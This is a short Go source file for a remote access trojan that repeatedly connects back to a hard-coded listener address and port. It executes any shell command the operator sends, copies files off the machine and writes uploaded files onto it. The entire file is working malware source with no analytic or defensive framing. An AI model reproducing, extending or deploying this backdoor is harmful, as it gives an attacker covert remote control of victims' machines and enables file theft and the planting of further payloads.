
// Enhanced RAT core with auto-reconnect, command handler, and file upload/download
package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	LHOST = "192.168.1.10"
	LPORT = "4444"
)

func main() {
	for {
		conn, err := net.Dial("tcp", LHOST+":"+LPORT)
		if err == nil {
			handleConnection(conn)
		}
		time.Sleep(10 * time.Second)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	r := bufio.NewReader(conn)

	for {
		cmdLine, err := r.ReadString('\n')
		if err != nil {
			break
		}
		cmd := strings.TrimSpace(cmdLine)

		switch {
		case cmd == "exit":
			return
		case strings.HasPrefix(cmd, "cmd "):
			output := runShell(strings.TrimPrefix(cmd, "cmd "))
			conn.Write([]byte(output))
		case strings.HasPrefix(cmd, "download "):
			sendFile(conn, strings.TrimPrefix(cmd, "download "))
		case strings.HasPrefix(cmd, "upload "):
			receiveFile(conn, strings.TrimPrefix(cmd, "upload "))
		default:
			conn.Write([]byte("[RAT] Unknown command\n"))
		}
	}
}

func runShell(command string) string {
	cmd := exec.Command("sh", "-c", command)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("[RAT] Error: %v\n", err)
	}
	return string(out)
}

func sendFile(conn net.Conn, path string) {
	file, err := os.Open(path)
	if err != nil {
		conn.Write([]byte("[RAT] Failed to open file\n"))
		return
	}
	defer file.Close()
	io.Copy(conn, file)
}

func receiveFile(conn net.Conn, path string) {
	file, err := os.Create(path)
	if err != nil {
		conn.Write([]byte("[RAT] Failed to create file\n"))
		return
	}
	defer file.Close()
	io.CopyN(file, conn, 1024*1024) // limit to 1MB for now
	conn.Write([]byte("[RAT] Upload complete\n"))
}
